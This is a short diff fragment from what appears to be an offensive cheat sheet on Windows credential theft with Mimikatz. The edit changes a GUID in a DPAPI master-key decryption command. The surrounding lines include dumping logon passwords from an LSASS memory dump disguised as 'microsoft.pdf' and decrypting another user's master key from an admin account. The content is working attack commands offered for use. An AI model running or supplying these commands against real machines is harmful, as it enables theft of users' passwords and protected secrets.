@@ -80,7 +80,7 @@ mimikatz.exe "sekurlsa::minidump microsoft.pdf" sekurlsa::logonPasswords exit
 Machine A:
 
 For same logged-in user:
-dpapi::masterkey /in:"C:\Users\user01\AppData\Roaming\Microsoft\Protect\S-1-5-21-SOME-RANDOM-NUMBERS-1165\812b1791-73e2-4e58-b67f-5ce4891a79cd" /rpc
+dpapi::masterkey /in:"C:\Users\user01\AppData\Roaming\Microsoft\Protect\S-1-5-21-SOME-RANDOM-NUMBERS-1165\9c08e1e4-8719-4479-b104-875d3a02e6e7" /rpc
 (or)
 From Admin for different user in the same machine:
 dpapi::masterkey /in:"C:\Users\user01\AppData\Roaming\Microsoft\Protect\S-1-5-21-SOME-RANDOM-NUMBERS-1165\9c08e1e4-8719-4479-b104-875d3a02e6e7" /rpc
